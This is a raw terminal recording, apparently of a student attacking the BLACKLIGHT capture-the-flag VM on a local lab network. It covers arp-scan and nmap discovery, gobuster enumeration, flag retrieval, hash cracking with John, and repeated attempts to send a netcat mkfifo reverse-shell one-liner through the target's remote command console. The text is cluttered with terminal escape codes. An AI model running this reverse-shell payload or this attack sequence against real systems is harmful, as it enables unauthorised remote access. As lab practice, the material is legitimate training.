@@ -1,0 +1,316 @@
+Script started on 2025-11-29 11:15:40+03:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="34" LINES="33"]
+]4;0;#060302\]4;1;#903513\]4;2;#A25024\]4;3;#D06B25\]4;4;#CE7847\]4;5;#E78C34\]4;6;#EEA951\]4;7;#f2dbae\]4;8;#a99979\]4;9;#903513\]4;10;#A25024\]4;11;#D06B25\]4;12;#CE7847\]4;13;#E78C34\]4;14;#EEA951\]4;15;#f2dbae\]10;#f2dbae\]11;#060302\]12;#f2dbae\]13;#f2dbae\]17;#f2dbae\]19;#060302\]4;232;#060302\]4;256;#f2dbae\]708;#060302\]4;0;#060302\]4;1;#903513\]4;2;#A25024\]4;3;#D06B25\]4;4;#CE7847\]4;5;#E78C34\]4;6;#EEA951\]4;7;#f2dbae\]4;8;#a99979\]4;9;#903513\]4;10;#A25024\]4;11;#D06B25\]4;12;#CE7847\]4;13;#E78C34\]4;14;#EEA951\]4;15;#f2dbae\]10;#f2dbae\]11;#060302\]12;#f2dbae\]13;#f2dbae\]17;#f2dbae\]19;#060302\]4;232;#060302\]4;256;#f2dbae\]708;#060302\[?2004h[..............~]$ 
+[?2004l[?2004h[..............~]$ nmap[Ksudo nmap -[K[Karp [K-scan - [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C- l 
+[?2004l[sudo] password for feizal: 
+Interface: wlo1, type: EN10MB, MAC: 2c:33:7a:27:d0:2f, IPv4: 192.168.100.51
+Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.100.1	58:ae:a8:53:ce:1f	HUAWEI TECHNOLOGIES CO.,LTD
+192.168.100.151	08:00:27:4c:e6:f9	PCS Systemtechnik GmbH
+192.168.100.147	36:ba:cf:91:d6:e3	(Unknown: locally administered)
+192.168.100.125	b6:c1:04:c2:6e:7a	(Unknown: locally administered)
+192.168.100.121	4c:e6:c0:db:83:dc	Apple, Inc.
+192.168.100.128	00:19:0d:39:63:e4	IEEE 1394c
+192.168.100.122	f2:d2:22:7b:f2:44	(Unknown: locally administered)
+192.168.100.119	fe:03:a9:84:b2:23	(Unknown: locally administered)
+
+8 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.10.0: 256 hosts scanned in 2.066 seconds (123.91 hosts/sec). 8 responded
+[?2004h[..............~]$ sudo a[Knmap -sC   -sV  [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Carp-scan -l [K192.168.151[C15101510151.151
+[?2004lInterface: wlo1, type: EN10MB, MAC: 2c:33:7a:27:d0:2f, IPv4: 192.168.100.51
+ERROR: You can not specify targets with the --localnet option
+[?2004h[..............~]$ sudo arp-scan -l 192.168.100.151[C[C[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C -l 192.168[8P.100.151[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cn -l 192.168.100.151[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cm -l 192.168.100.151[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Ca -l 192.168.100.151[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cp -l 192.168.100.151[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C -l 192.168.100.151[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C192.1[3P68.100.151[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C- 192.168.100.151[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cs 192.168.100.151[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[CC 192.168.100.151[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C 192.168.100.151[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C- 192.168.100.151s 192.168.100.151[CV 192.168.100.151[C[C[C 192.168.100.151[C[C[C
+[?2004lStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-29 11:16 EAT
+
+[?2004h[..............~]$ sudo nmap -sC -sV  192.168.100.151 > l.[K[Kl[Kblacklight.t xt
+[?2004l[?2004h[..............~]$ cat blacklight.txt
+[?2004lStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-29 11:16 EAT
+Nmap scan report for 192.168.100.151
+Host is up (0.00030s latency).
+Not shown: 999 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-title: BLACKLIGHT
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+MAC Address: 08:00:27:4C:E6:F9 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.61 seconds
+[?2004h[..............~]$ vurl [Kdirbi[Kuster [K[K[..............~]$ [K[..............~]$ gobuster dir -u  http://192.168.100.151 -w /usr/sh are/wordlists/dirb/
+big.txt
+catala.txt
+common.txt
+euskera.txt
+extensions_common.txt
+indexes.txt
+mutations_common.txt
+others/
+small.txt
+spanish.txt
+stress/
+vulns/
+[..............~]$ gobuster dir -u http://192.168.100.151 -w /usr/share/wordlists/dirb/common.txt 
+[?2004l===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.100.151
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+[2K/.hta                [33m (Status: 403)[0m [Size: 294]
+[2K/.htpasswd           [33m (Status: 403)[0m [Size: 299]
+[2K/.htaccess           [33m (Status: 403)[0m [Size: 299]
+[2K/css                 [36m (Status: 301)[0m [Size: 316][34m [--> http://192.168.100.151/css/][0m
+[2K/fonts               [36m (Status: 301)[0m [Size: 318][34m [--> http://192.168.100.151/fonts/][0m
+[2K/footer              [36m (Status: 301)[0m [Size: 319][34m [--> http://192.168.100.151/footer/][0m
+[2K/img                 [36m (Status: 301)[0m [Size: 316][34m [--> http://192.168.100.151/img/][0m
+[2K/index.html          [32m (Status: 200)[0m [Size: 1759]
+[2K/javascript          [36m (Status: 301)[0m [Size: 323][34m [--> http://192.168.100.151/javascript/][0m
+[2K/js                  [36m (Status: 301)[0m [Size: 315][34m [--> http://192.168.100.151/js/][0m
+[2KProgress: 2334 / 4615 (50.57%)[2K/robots.txt          [32m (Status: 200)[0m [Size: 40]
+[2K/server-status       [33m (Status: 403)[0m [Size: 303]
+[2KProgress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+[?2004h[..............~]$ gobuster dir -u http://192.168.100.151 -w /usr/share/wordlists/dirb/common.txt  > d ire[K[K[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K> e num1 [K[K2.txt
+[?2004l[2KProgress: 2172 / 4615 (47.06%)[2KProgress: 4063 / 4615 (88.04%)[2KProgress: 4614 / 4615 (99.98%)[?2004h[..............~]$ curl enum2.txt/usr/share/wordlists/dirb/common.txt[Ablacklight.txt[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C192.168.100.151[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C-l[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[1Plhttp://192.168.100.151/flag1.txt[A[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C^C[?2004l[?2004h[?2004l
+[?2004h[..............~]$ curl http://192 .168.100.151/robots.txt
+[?2004lUser-agent: *
+flag1.txt
+blacklight.dict
+[?2004h[..............~]$ curl http://192.168.100.151/robots.txt[6P.txt[Kflag1.txt
+[?2004l{flag1:fc4c7223964a26b152823d14f129687207e7fe15}
+
+9072. The secret is at home.[?2004h[..............~]$ [K[..............~]$ curl http://192.168.100.151/flag1.txt[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[K[..............~]$ sudo nmap -p- 1 92.168.100.151 -sV 
+[?2004lStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-29 11:21 EAT
+Stats: 0:02:32 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 50.00% done; ETC: 11:26 (0:02:31 remaining)
+Nmap scan report for 192.168.100.151
+Host is up (0.00022s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
+9072/tcp open  unknown
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port9072-TCP:V=7.94SVN%I=7%D=11/29%Time=692AAD11%P=x86_64-pc-linux-gnu%
+SF:r(NULL,34,"BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20i
+SF:nstructions\n")%r(GenericLines,34,"BLACKLIGHT\x20console\x20mk1\.\x20Ty
+SF:pe\x20\.help\x20for\x20instructions\n")%r(GetRequest,34,"BLACKLIGHT\x20
+SF:console\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n")%r(HTTPOpt
+SF:ions,34,"BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20ins
+SF:tructions\n")%r(RTSPRequest,34,"BLACKLIGHT\x20console\x20mk1\.\x20Type\
+SF:x20\.help\x20for\x20instructions\n")%r(RPCCheck,34,"BLACKLIGHT\x20conso
+SF:le\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n")%r(DNSVersionBi
+SF:ndReqTCP,34,"BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x2
+SF:0instructions\n")%r(DNSStatusRequestTCP,34,"BLACKLIGHT\x20console\x20mk
+SF:1\.\x20Type\x20\.help\x20for\x20instructions\n")%r(Help,34,"BLACKLIGHT\
+SF:x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n")%r(SSLS
+SF:essionReq,34,"BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x
+SF:20instructions\n")%r(TerminalServerCookie,34,"BLACKLIGHT\x20console\x20
+SF:mk1\.\x20Type\x20\.help\x20for\x20instructions\n")%r(TLSSessionReq,34,"
+SF:BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instructions
+SF:\n")%r(Kerberos,34,"BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x2
+SF:0for\x20instructions\n")%r(SMBProgNeg,34,"BLACKLIGHT\x20console\x20mk1\
+SF:.\x20Type\x20\.help\x20for\x20instructions\n")%r(X11Probe,34,"BLACKLIGH
+SF:T\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n")%r(Fo
+SF:urOhFourRequest,34,"BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x2
+SF:0for\x20instructions\n")%r(LPDString,34,"BLACKLIGHT\x20console\x20mk1\.
+SF:\x20Type\x20\.help\x20for\x20instructions\n")%r(LDAPSearchReq,34,"BLACK
+SF:LIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n")%
+SF:r(LDAPBindReq,34,"BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20f
+SF:or\x20instructions\n")%r(SIPOptions,34,"BLACKLIGHT\x20console\x20mk1\.\
+SF:x20Type\x20\.help\x20for\x20instructions\n")%r(LANDesk-RC,34,"BLACKLIGH
+SF:T\x20console\x20mk1\.\x20Type\x20\.help\x20for\x20instructions\n")%r(Te
+SF:rminalServer,34,"BLACKLIGHT\x20console\x20mk1\.\x20Type\x20\.help\x20fo
+SF:r\x20instructions\n");
+MAC Address: 08:00:27:4C:E6:F9 (Oracle VirtualBox virtual NIC)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 158.84 seconds
+[?2004h[..............~]$ curl [K[K[K[K[Knc 192.168.100.151 9072
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.help
+.readhash - Get one step closer
+.exec <cmd> - Execute commands
+.quit - Exit the server
+.readhash 
+b5f4723bd6df85b54b0905bd6d734be9ef1cc1eb977413a932a828b5c52ef5a6
+You have one more command until the server shuts down. Choose wisely!
+^T^C
+[?2004h[..............~]$ john
+john        john-haiti  
+[..............~]$ john
+john        john-haiti  
+[..............~]$ john -w d[K[K[Kls
+[?2004l assignment2.pdf   PENETRATIONTESTING
+ aws		   php-reverse-shell
+ b12		   Pictures
+ blacklight.txt    Public
+ CRYPTOGRAPHY	   resources
+ Desktop	   roadmap
+ Documents	   roadmap.save
+ Downloads	   Templates
+ enum2.txt	   todo
+ go		   typescript
+ l		   Untitled.ipynb
+ l2		   Videos
+ l.txt		  'VirtualBox VMs'
+ Music		   yersinia.log
+[?2004h[..............~]$ r[K[K[..............~]$ [K[..............~]$ wget http?;[K[K://192.168.100.151/ blacklight.dict 
+[?2004l--2025-11-29 11:29:47--  http://192.168.100.151/blacklight.dict
+Connecting to 192.168.100.151:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3008 (2.9K)
+Saving to: ‘blacklight.dict’
+
+blacklight.d   0%       0  --.-KB/s               blacklight.d 100%   2.94K  --.-KB/s    in 0s      
+
+2025-11-29 11:29:47 (192 MB/s) - ‘blacklight.dict’ saved [3008/3008]
+
+[?2004h[..............~]$ john -w [Kecho [7mb5f4723bd6df85b54b0905b[27m[7md[27m[7m6d734be9ef1cc1eb977413a932a828b5c52ef5a6[27m[Ab5f4723bd6df85b54b0905bd6d734be9ef1cc1eb977413a932a828b5c52ef5a6 > has h.txt
+[?2004l[?2004h[..............~]$ john -w [K=/[K./blacklight.dict  h ash.txt  --format=raw-sha56[K[K[K256a256
+[?2004lUsing default input encoding: UTF-8
+Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
+Warning: poor OpenMP scalability for this hash type, consider --fork=4
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:00 DONE (2025-11-29 11:31) 0g/s 1283p/s 1283c/s 1283C/s 000000..covfefe
+Session completed. 
+[?2004h[..............~]$ tcpdump -i wlo1 icmp 
+[?2004ltcpdump: wlo1: You don't have permission to perform this capture on that device
+(socket: Operation not permitted)
+[?2004h[..............~]$ sudo !!
+[?2004lsudo tcpdump -i wlo1 icmp 
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on wlo1, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+11:36:34.477939 IP 192.168.100.51 > dns.google: ICMP 192.168.100.51 udp port 24642 unreachable, length 140
+^C
+1 packet captured
+1 packet received by filter
+0 packets dropped by kernel
+[?2004h[..............~]$ ##turns out you only have 2  attempts befors[Ke the connection gets closed so i  hav  [Ke[K[Ke to resre==[K[K[K[K[Ke[Ksett [K[K the machine to oget [K[K[K[K[Kget2 more optio[K[K[K[Kchances  
+[?2004l[?2004h[..............~]$ #i have a .exec opr[Ktion  so a  reverse shell pers[Khaps
+[?2004l[?2004h[..............~]$ [7mrm /tmp/f;mkfifo /tmp/f;cat [27m[7m/[27m[7mtmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f[27m 
+[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Crm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f 
+[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[4P >/tmp/f
+
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[9P >/tmp/f1 >/tmp/f9 >/tmp/f2 >/tmp/f. >/tmp/f1 >/tmp/f6 >/tmp/f8 >/tmp/f. >/tmp/f1 >/tmp/f0 >/tmp/f0 >/tmp/f. >/tmp/f
+[K[A[K[A[K[..............~]$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100. >/tmp/f 
+[K[A[K[A[K[..............~]$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100. >/tmp/f 5 >/tmp/f [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C1 >/tmp/f [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C >/tmp/f[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C1 >/tmp/f[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C2 >/tmp/f[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C3 >/tmp/f[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C4 >/tmp/f[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C >/tmp/f[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C >/tmp/f                     [K
+[K
+[K[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7mrm /tmp/f;mkfifo /tmp/f;cat [27m[7m/[27m[7mtmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f[27m 
+[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K
+[K
+[K
+[K[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cnc 192.168.151051051.51151[C[C 9072
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec '^C
+[?2004h[..............~]$ nc 192.168.100.151 9072
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+Bye!
+^C
+[?2004h[..............~]$ nc 192.168.100.151 9072[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[7mrm /tmp/f;mkfifo /tmp/f;cat [27m[7m/[27m[7mtmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f[27m 
+[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Crm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f 
+[K[A"[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Crm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[7m"rm /tmp/f;mkfifo /tmp/f;cat[27m[7m [27m[7m/tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/[27m[7mf[27m[7m"[27mrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"[A[C[C[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Crm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"[K
+[K[A[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C
+
+
+[?2004l[?2004h> [K> ^C[?2004l[?2004h[?2004l
+[?2004h[..............~]$ [7m"rm /tmp/f;mkfifo /tmp/[27m[7mf[27m[7m;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1[27m[7m2[27m[7m34 >/tmp/f"[27m[A[A[C[C[C[C[C[C[C"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 12[1P34 >/tmp/f"
+[?2004lbash: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f: No such file or directory
+[?2004h[..............~]$ .[Knc 192.168.100.151 901[K72  
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"^[[D^[[D^[[D^[[D^?^?^?^?^?^?^?^?^?^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C1 1234[2P >/tmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C1 1234 [1P>/tmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C 1234 >[1P/tmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C 1234 >/[1Ptmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C 1234 >/t[1Pmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C 1234 >/tm[1Pp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C 1234 >/tmp[1P/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C1234 >/tmp/[1Pf"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C 1234 >/tmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C1 1234 >/tmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C9 1234 >/tmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C2 1234 >/tmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C. 1234 >/tmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C1 1234 >/tmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C6 1234 >/tmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C8 1234 >/tmp/f"[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C. 12[1@3[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C1 1[1@2[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C0 [1@1[1@0[1@.[1@5[1@1[C[1@ [A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[9P 1234 >/tmp/f"
+[K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[7m"rm /tmp/f;mkfifo /tmp/[27m[7mf[27m[7m;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.10[27m[7m0[27m[7m.51  1234 >/tmp/f"[27m^C[?2004l[?2004h[?2004l
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f"[A[A[C[C[C[C[C[C[Crm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 123[1P[C[C[C[C[C[C[C[C[C[C[A[A[C[C[C[C[C[C[C[Cnc 192.168.100.151 9072 [K
+[K[A[A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exce^?^?^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.51  1234 >/tmp/f"
+Bye!
+
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004l[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.51  1234 >/tmp/f"
+You have one more command until the server shuts down. Choose wisely!
+
+You have one more command until the server shuts down. Choose wisely!
+^[[A^U^?^?
+You have one more command until the server shuts down. Choose wisely!
+.exec "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.51  1234 >/tmp/f"
+Bye!
+^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.51  1234 >/tmp/f"
+You have one more command until the server shuts down. Choose wisely!
+.exec "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.100.51  1234 >/tmp/f"
+Bye!
+^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec rm /tmp/f:^?;mkfifp^?o ^?^?^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
+[?2004lBLACKLIGHT console mk1. Type .help for instructions
+.exec rm /tmp/f;mkfiffo^?^?o^?^C
+[?2004h[..............~]$ nc 192.168.100.151 9072 [A[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K2
